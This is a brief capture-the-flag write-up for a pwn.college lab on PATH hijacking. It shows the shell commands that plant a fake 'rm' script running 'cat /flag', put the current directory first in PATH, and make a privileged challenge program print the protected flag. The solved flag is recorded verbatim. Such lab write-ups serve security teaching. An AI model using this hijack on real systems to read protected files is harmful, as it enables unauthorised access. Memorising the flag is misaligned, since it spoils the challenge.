# Challenge Name
Hijacking Commands

## My solve
**Flag:** `pwn.college{EGumzng1hvNtkYjtptqXX5cthEw.QX3cjM1wCN3gjNzEzW}`

This was basically a combination of all challenges in this module. I had to echo `cat/flag` to rm so that when `/challenge/ru` will run rm it will simply print the flag. I then made rm a executable after which I set the current path. Finally running the /challenge/run gave me the flag.
```bash
hacker@path~hijacking-commands:~$ echo 'cat /flag' > rm
hacker@path~hijacking-commands:~$ chmod +x rm
hacker@path~hijacking-commands:~$ export PATH=".:$PATH"
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
pwn.college{EGumzng1hvNtkYjtptqXX5cthEw.QX3cjM1wCN3gjNzEzW}
```
